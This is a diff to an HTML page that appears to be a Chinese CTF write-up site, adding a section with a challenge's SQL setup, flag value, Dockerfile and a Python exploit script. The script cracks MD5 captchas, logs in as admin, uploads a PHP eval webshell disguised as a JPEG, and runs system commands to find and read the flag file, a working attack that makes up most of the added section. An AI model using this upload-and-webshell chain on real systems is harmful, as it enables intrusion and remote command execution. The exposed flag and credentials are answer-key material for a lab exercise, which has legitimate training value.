@@ -3162,6 +3162,13 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#_3" title="构建镜像绕过反序列化" class="md-nav__link">
+    构建镜像绕过反序列化
+  </a>
+  
+</li>
+      
       
       
       
@@ -3476,6 +3483,13 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#_3" title="构建镜像绕过反序列化" class="md-nav__link">
+    构建镜像绕过反序列化
+  </a>
+  
+</li>
+      
       
       
       
@@ -3511,13 +3525,13 @@
 4
 5
 6
-7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ cat 19-08-17_16-45-47 | grep 200
-200    16KB  http://127.0.0.1:11027/.config.php.swp
-200     0B   http://127.0.0.1:11027/config.php
-200    83KB  http://127.0.0.1:11027/phpinfo.php
-200   934B   http://127.0.0.1:11027/upload/
-200     0B   http://127.0.0.1:11027/upload/test.txt
-200     0B   http://127.0.0.1:11027/user.php
+7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$ cat <span class="m">19</span>-08-17_16-45-47 <span class="p">|</span> grep <span class="m">200</span>
+<span class="m">200</span>    16KB  http://127.0.0.1:11027/.config.php.swp
+<span class="m">200</span>     0B   http://127.0.0.1:11027/config.php
+<span class="m">200</span>    83KB  http://127.0.0.1:11027/phpinfo.php
+<span class="m">200</span>   934B   http://127.0.0.1:11027/upload/
+<span class="m">200</span>     0B   http://127.0.0.1:11027/upload/test.txt
+<span class="m">200</span>     0B   http://127.0.0.1:11027/user.php
 </pre></div>
 </td></tr></table>
 
@@ -4080,6 +4094,249 @@ Content-Length: <span class="m">382</span>
 <li><a href="https://mp.weixin.qq.com/s?src=11&amp;timestamp=1565858991&amp;ver=1791&amp;signature=hIX-hA2DxsOWzLHCIU*ONH0q*E4MWL0i*qmhQnBIqlmpZh6KD9ehk8XcyEuhmnnYbNa2g8jNrYwm44C5zZchM*Nb*lV1buaXryI1huMoEZuY88CG8usGQF55mPb6TDGl&amp;new=1">Docker教程：Docker Compose入门</a></li>
 </ul>
 </details>
+<h2 id="_3">构建镜像绕过反序列化<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="superfences-tabs">
+<input name="__tabs_2" type="radio" id="__tab_2_0" checked="checked" />
+<label for="__tab_2_0">SQL</label>
+<div class="superfences-content"><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6
+7</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="k">CREATE</span> <span class="k">database</span> <span class="n">jaivyctf</span><span class="p">;</span>
+<span class="n">use</span> <span class="n">jaivyctf</span><span class="p">;</span>
+<span class="k">create</span> <span class="k">table</span> <span class="n">ctf_users</span> <span class="p">(</span><span class="n">id</span> <span class="nb">int</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="n">AUTO_INCREMENT</span><span class="p">,</span><span class="n">username</span> <span class="nb">char</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span><span class="n">password</span> <span class="nb">char</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span><span class="n">ip</span> <span class="nb">char</span><span class="p">(</span><span class="mi">50</span><span class="p">),</span><span class="n">is_admin</span> <span class="nb">char</span><span class="p">(</span><span class="mi">10</span><span class="p">),</span><span class="n">allow_diff_ip</span> <span class="nb">char</span><span class="p">(</span><span class="mi">10</span><span class="p">));</span>
+<span class="k">create</span> <span class="k">table</span> <span class="n">ctf_user_signature</span> <span class="p">(</span><span class="n">id</span> <span class="nb">int</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="n">AUTO_INCREMENT</span><span class="p">,</span><span class="n">username</span> <span class="nb">char</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span><span class="n">userid</span> <span class="nb">int</span><span class="p">,</span><span class="n">signature</span> <span class="nb">text</span><span class="p">,</span><span class="n">mood</span> <span class="nb">text</span><span class="p">);</span>
+<span class="hll"><span class="k">insert</span> <span class="k">into</span> <span class="n">ctf_users</span><span class="p">(</span> <span class="o">`</span><span class="n">username</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">ip</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">is_admin</span><span class="o">`</span><span class="p">,</span><span class="o">`</span><span class="n">allow_diff_ip</span><span class="o">`</span> <span class="p">)</span> <span class="k">values</span> <span class="p">(</span> <span class="s1">&#39;admin&#39;</span><span class="p">,</span><span class="s1">&#39;c991707fdf339958eded91331fb11ba0&#39;</span><span class="p">,</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">);</span>
+</span><span class="k">CREATE</span> <span class="k">USER</span> <span class="s1">&#39;jaivy&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span> <span class="n">IDENTIFIED</span> <span class="k">BY</span> <span class="s1">&#39;jaivypassword666&#39;</span><span class="p">;</span>
+<span class="k">grant</span> <span class="k">all</span> <span class="k">privileges</span> <span class="k">on</span> <span class="o">`</span><span class="n">jaivyctf</span><span class="o">`</span><span class="p">.</span><span class="o">*</span> <span class="k">to</span> <span class="s1">&#39;jaivy&#39;</span><span class="o">@</span><span class="s1">&#39;%&#39;</span> <span class="n">identified</span> <span class="k">by</span> <span class="s1">&#39;jaivypassword666&#39;</span><span class="p">;</span>
+</pre></div>
+</td></tr></table></div>
+<input name="__tabs_2" type="radio" id="__tab_2_1" />
+<label for="__tab_2_1">flag</label>
+<div class="superfences-content"><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>flag{a08cea9cc237532dbd168c6b8ebbc32d}
+</pre></div>
+</td></tr></table></div>
+<input name="__tabs_2" type="radio" id="__tab_2_2" />
+<label for="__tab_2_2">Dockerfile</label>
+<div class="superfences-content"><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>ROM andreisamuilik/php5.5.9-apache2.4-mysql5.5
+
+COPY run.sh /run.sh
+RUN chmod 755 /run.sh
+RUN rm -rf /app
+COPY app /app/
+
+RUN chmod 755 -R /app
+RUN chmod 777 /app/upload
+RUN ls -al / | grep app
+RUN ls -al /app
+COPY sql.sql /tmp/
+RUN chmod 777 -R /tmp
+
+<span class="hll">COPY flag.txt /etc/flag_is_He4e_89587236.txt
+</span><span class="hll">RUN chmod 744 /etc/flag_is_He4e_89587236.txt
+</span>
+EXPOSE 80
+CMD [&quot;/run.sh&quot;]
+</pre></div>
+</td></tr></table></div>
+<input name="__tabs_2" type="radio" id="__tab_2_3" />
+<label for="__tab_2_3">uploadshell</label>
+<div class="superfences-content"><table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
+
+<span class="n">_target</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1:11027/&#39;</span>
+<span class="n">_action</span> <span class="o">=</span> <span class="n">_target</span> <span class="o">+</span> <span class="s1">&#39;index.php?action=&#39;</span>
+
+<span class="k">def</span> <span class="nf">get_code_dict</span><span class="p">():</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="s1">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []{}&lt;&gt;~`+=,.;:/?|&#39;</span>
+    <span class="n">captchas</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">product</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">3</span><span class="p">)]</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] Genering {} captchas...&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">captchas</span><span class="p">)))</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;captchas.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">captchas</span><span class="p">:</span>
+            <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">k</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">+</span><span class="s1">&#39; --&gt; &#39;</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">get_creds</span><span class="p">():</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">))</span>
+    <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span>
+
+<span class="c1">#code</span>
+<span class="k">def</span> <span class="nf">solve_code</span><span class="p">(</span><span class="n">html</span><span class="p">):</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]{5})\)&#39;</span><span class="p">,</span> <span class="n">html</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">solution</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;grep&#39;</span><span class="p">,</span> <span class="s1">&#39;^&#39;</span><span class="o">+</span><span class="n">code</span><span class="p">,</span> <span class="s1">&#39;captchas.txt&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">split</span><span class="p">()[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">solution</span>
+
+<span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;register&#39;</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">solve_code</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;register&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s1">&#39;code&#39;</span><span class="p">:</span><span class="n">code</span><span class="p">})</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;login&#39;</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">solve_code</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="n">password</span><span class="p">,</span><span class="s1">&#39;code&#39;</span><span class="p">:</span><span class="n">code</span><span class="p">})</span>
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="k">def</span> <span class="nf">publish</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">mood</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;publish&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;signature&#39;</span><span class="p">:</span><span class="n">sig</span><span class="p">,</span><span class="s1">&#39;mood&#39;</span><span class="p">:</span><span class="n">mood</span><span class="p">})</span><span class="c1">#, proxies={&#39;http&#39;:&#39;127.0.0.1:8080&#39;})</span>
+
+<span class="k">def</span> <span class="nf">get_prc_now</span><span class="p">():</span>
+    <span class="c1"># date_default_timezone_set(&quot;PRC&quot;) is not important</span>
+    <span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;php&#39;</span><span class="p">,</span> <span class="s1">&#39;-r&#39;</span><span class="p">,</span> <span class="s1">&#39;date_default_timezone_set(&quot;PRC&quot;); echo time();&#39;</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">get_admin_session</span><span class="p">():</span>
+    <span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+    <span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;login&#39;</span><span class="p">)</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">solve_code</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">sess</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">],</span> <span class="n">code</span>
+
+<span class="c1"># get_code_dict()</span>
+
+<span class="c1"># print(&#39;[+] creating user session&#39;)</span>
+<span class="n">sess</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+<span class="n">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span>
+<span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;jaivypassword&#39;</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] login({}, {})&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">))</span>
+<span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] user session =&gt; &#39;</span> <span class="o">+</span> <span class="n">sess</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get_dict</span><span class="p">()[</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">])</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] uploading stager&#39;</span><span class="p">)</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;pic&#39;</span><span class="p">:</span> <span class="p">(</span><span class="s1">&#39;jaivy.php&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;?php @eval($_POST[jaivy]);?&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;image/jpeg&#39;</span><span class="p">)}</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">_action</span><span class="o">+</span><span class="s1">&#39;publish&#39;</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">shell</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="n">webshell_url</span><span class="o">=</span><span class="n">_target</span><span class="o">+</span><span class="s1">&#39;upload/jaivy.php&#39;</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;[+] shell =&gt; &#39;</span><span class="o">+</span><span class="n">webshell_url</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+
+<span class="n">post_data</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;jaivy&quot;</span><span class="p">:</span><span class="s2">&quot;system(&#39;find / -name </span><span class="se">\&quot;</span><span class="s2">*flag*</span><span class="se">\&quot;</span><span class="s2">&#39;);&quot;</span><span class="p">}</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">webshell_url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+<span class="n">post_data</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;jaivy&quot;</span><span class="p">:</span><span class="s2">&quot;system(&#39;cat /etc/flag_is_He4e_89587236.txt&#39;);&quot;</span><span class="p">}</span>
+<span class="n">resp</span> <span class="o">=</span> <span class="n">sess</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">webshell_url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</pre></div>
+</td></tr></table></div>
+</div>
                 
                   
                 
